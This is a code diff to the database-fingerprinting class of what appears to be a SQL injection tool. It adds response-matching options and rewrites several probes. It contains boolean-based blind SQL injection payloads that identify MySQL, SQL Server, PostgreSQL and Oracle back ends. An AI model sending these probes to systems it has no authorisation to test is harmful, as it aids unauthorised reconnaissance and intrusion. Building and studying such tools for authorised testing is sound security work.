@@ -62,6 +62,10 @@ class FingerPrintDBMS:
         attack="",
         attacks=None,
         case=None,
+        code=None,
+        match_string=None,
+        not_match_string=None,
+        text_only=False,
     ):
         self.base = base
         self.parameter = parameter
@@ -79,6 +83,10 @@ class FingerPrintDBMS:
         self.attack01 = attack
         self._attacks = attacks
         self._case = case
+        self.code = code
+        self.match_string = match_string
+        self.not_match_string = not_match_string
+        self.text_only = text_only
 
     def check_boolean_expression(self, expression, expected=True):
         expression = self.vector.replace("[INFERENCE]", expression)
@@ -108,10 +116,17 @@ class FingerPrintDBMS:
                 expression="(SELECT QUARTER(NULL)) IS NULL"
             )
             attack01 = self.check_boolean_expression(
-                expression="(SELECT 0x47776a68)=0x47776a65"
-                # "(SELECT 0x47776a68)='qSBB'"
+                expression="(SELECT 0x47776a68)='qSBB'"  # "(SELECT 0x47776a68)=0x47776a65"
             )
-            result, case, _ = check_boolean_responses(self.base, attack, attack01)
+            result, case, _ = check_boolean_responses(
+                self.base,
+                attack,
+                attack01,
+                match_string=self.match_string,
+                not_match_string=self.not_match_string,
+                code=self.code,
+                text_only=self.text_only,
+            )
             if result:
                 is_ok = False
                 if self._attacks:
@@ -139,7 +154,15 @@ class FingerPrintDBMS:
             attack = self.check_boolean_expression(
                 expression="(SELECT QUARTER(NULL)) IS NULL"
             )
-            result, case, _ = check_boolean_responses(self.base, attack, self.attack01)
+            result, case, _ = check_boolean_responses(
+                self.base,
+                attack,
+                self.attack01,
+                match_string=self.match_string,
+                not_match_string=self.not_match_string,
+                code=self.code,
+                text_only=self.text_only,
+            )
             ok = False
             if result:
                 logger.info(f"confirming MySQL")
@@ -147,7 +170,13 @@ class FingerPrintDBMS:
                     expression="SESSION_USER() LIKE USER()"
                 )
                 result, case, _ = check_boolean_responses(
-                    self.base, attack, self.attack01
+                    self.base,
+                    attack,
+                    self.attack01,
+                    match_string=self.match_string,
+                    not_match_string=self.not_match_string,
+                    code=self.code,
+                    text_only=self.text_only,
                 )
                 if not result:
                     # Note: MemSQL doesn't support SESSION_USER()
@@ -155,7 +184,13 @@ class FingerPrintDBMS:
                         expression="GEOGRAPHY_AREA(NULL) IS NULL"
                     )
                     result, case, _ = check_boolean_responses(
-                        self.base, attack, self.attack01
+                        self.base,
+                        attack,
+                        self.attack01,
+                        match_string=self.match_string,
+                        not_match_string=self.not_match_string,
+                        code=self.code,
+                        text_only=self.text_only,
                     )
                 if not result:
                     warnMsg = "the back-end DBMS is not MySQL"
@@ -182,12 +217,20 @@ class FingerPrintDBMS:
             )
             attack01 = self.check_boolean_expression(
                 expression=quote(
-                    # "(SELECT CHAR(102)%2bCHAR(117)%2bCHAR(81)%2bCHAR(108))='pNmJ'",
-                    "(SELECT CHAR(102)%2bCHAR(117)%2bCHAR(81)%2bCHAR(108))=CHAR(102)%2bCHAR(117)%2bCHAR(81)%2bCHAR(106)",
+                    "(SELECT CHAR(102)%2bCHAR(117)%2bCHAR(81)%2bCHAR(108))='pNmJ'",
+                    # "(SELECT CHAR(102)%2bCHAR(117)%2bCHAR(81)%2bCHAR(108))=CHAR(102)%2bCHAR(117)%2bCHAR(81)%2bCHAR(106)",
                     safe="=%",
                 )
             )
-            result, case, _ = check_boolean_responses(self.base, attack, attack01)
+            result, case, _ = check_boolean_responses(
+                self.base,
+                attack,
+                attack01,
+                match_string=self.match_string,
+                not_match_string=self.not_match_string,
+                code=self.code,
+                text_only=self.text_only,
+            )
             if result:
                 is_ok = False
                 if self._attacks:
@@ -215,7 +258,15 @@ class FingerPrintDBMS:
             attack = self.check_boolean_expression(
                 expression="UNICODE(SQUARE(NULL)) IS NULL"
             )
-            result, case, _ = check_boolean_responses(self.base, attack, self.attack01)
+            result, case, _ = check_boolean_responses(
+                self.base,
+                attack,
+                self.attack01,
+                match_string=self.match_string,
+                not_match_string=self.not_match_string,
+                code=self.code,
+                text_only=self.text_only,
+            )
             ok = False
             if result:
                 logger.info(f"confirming Microsoft SQL Server")
@@ -237,7 +288,13 @@ class FingerPrintDBMS:
                     _ = bool(attack.redirected == lattack.redirected)
                     if _:
                         result, case, _ = check_boolean_responses(
-                            self.base, attack, self.attack01
+                            self.base,
+                            attack,
+                            self.attack01,
+                            match_string=self.match_string,
+                            not_match_string=self.not_match_string,
+                            code=self.code,
+                            text_only=self.text_only,
                         )
                         if result:
                             db_version = f" {version}"
@@ -261,10 +318,17 @@ class FingerPrintDBMS:
                 expression="(SELECT QUOTE_IDENT(NULL)) IS NULL"
             )
             attack01 = self.check_boolean_expression(
-                expression="(SELECT (CHR(76)||CHR(110)||CHR(85)||CHR(99)))=(CHR(76)||CHR(110)||CHR(85)||CHR(94))"
-                # "(SELECT (CHR(76)||CHR(110)||CHR(85)||CHR(99)))='QxXT'"
+                expression="(SELECT (CHR(76)||CHR(110)||CHR(85)||CHR(99)))='QxXT'"  # "(SELECT (CHR(76)||CHR(110)||CHR(85)||CHR(99)))=(CHR(76)||CHR(110)||CHR(85)||CHR(94))"
             )
-            result, case, _ = check_boolean_responses(self.base, attack, attack01)
+            result, case, _ = check_boolean_responses(
+                self.base,
+                attack,
+                attack01,
+                match_string=self.match_string,
+                not_match_string=self.not_match_string,
+                code=self.code,
+                text_only=self.text_only,
+            )
             if result:
                 is_ok = False
                 if self._attacks:
@@ -292,7 +356,15 @@ class FingerPrintDBMS:
             attack = self.check_boolean_expression(
                 expression="CONVERT_TO((CHR(115)||CHR(120)||CHR(115)||CHR(101)), QUOTE_IDENT(NULL)) IS NULL"
             )
-            result, case, _ = check_boolean_responses(self.base, attack, self.attack01)
+            result, case, _ = check_boolean_responses(
+                self.base,
+                attack,
+                self.attack01,
+                match_string=self.match_string,
+                not_match_string=self.not_match_string,
+                code=self.code,
+                text_only=self.text_only,
+            )
             ok = False
             if result:
                 logger.info(f"confirming PostgreSQL")
@@ -300,7 +372,13 @@ class FingerPrintDBMS:
                     expression="COALESCE(8009, NULL)=8009"
                 )
                 result, case, _ = check_boolean_responses(
-                    self.base, attack, self.attack01
+                    self.base,
+                    attack,
+                    self.attack01,
+                    match_string=self.match_string,
+                    not_match_string=self.not_match_string,
+                    code=self.code,
+                    text_only=self.text_only,
                 )
                 if not result:
                     warnMsg = "the back-end DBMS is not PostgreSQL"
@@ -325,10 +403,17 @@ class FingerPrintDBMS:
                 expression="(SELECT INSTR2(NULL,NULL) FROM DUAL) IS NULL"
             )
             attack01 = self.check_boolean_expression(
-                expression="(SELECT CHR(112)||CHR(116)||CHR(90)||CHR(78) FROM DUAL)=CHR(112)||CHR(116)||CHR(90)||CHR(76)"
-                # "(SELECT CHR(112)||CHR(116)||CHR(90)||CHR(78) FROM DUAL)='SOTQ'"
+                expression="(SELECT CHR(112)||CHR(116)||CHR(90)||CHR(78) FROM DUAL)='SOTQ'"  # "(SELECT CHR(112)||CHR(116)||CHR(90)||CHR(78) FROM DUAL)=CHR(112)||CHR(116)||CHR(90)||CHR(76)"
             )
-            result, case, _ = check_boolean_responses(self.base, attack, attack01)
+            result, case, _ = check_boolean_responses(
+                self.base,
+                attack,
+                attack01,
+                match_string=self.match_string,
+                not_match_string=self.not_match_string,
+                code=self.code,
+                text_only=self.text_only,
+            )
             if result:
                 is_ok = False
                 if self._attacks:
@@ -356,7 +441,15 @@ class FingerPrintDBMS:
             attack = self.check_boolean_expression(
                 expression="LENGTH(SYSDATE)=LENGTH(SYSDATE)"
             )
-            result, case, _ = check_boolean_responses(self.base, attack, self.attack01)
+            result, case, _ = check_boolean_responses(
+                self.base,
+                attack,
+                self.attack01,
+                match_string=self.match_string,
+                not_match_string=self.not_match_string,
+                code=self.code,
+                text_only=self.text_only,
+            )
             ok = False
             if result:
                 logger.info(f"confirming Oracle")
@@ -364,7 +457,13 @@ class FingerPrintDBMS:
                     expression="NVL(RAWTOHEX(5984),5984)=RAWTOHEX(5984)"
                 )
                 result, case, _ = check_boolean_responses(
-                    self.base, attack, self.attack01
+                    self.base,
+                    attack,
+                    self.attack01,
+                    match_string=self.match_string,
+                    not_match_string=self.not_match_string,
+                    code=self.code,
+                    text_only=self.text_only,
                 )
                 if not result:
                     warnMsg = "the back-end DBMS is not Oracle"
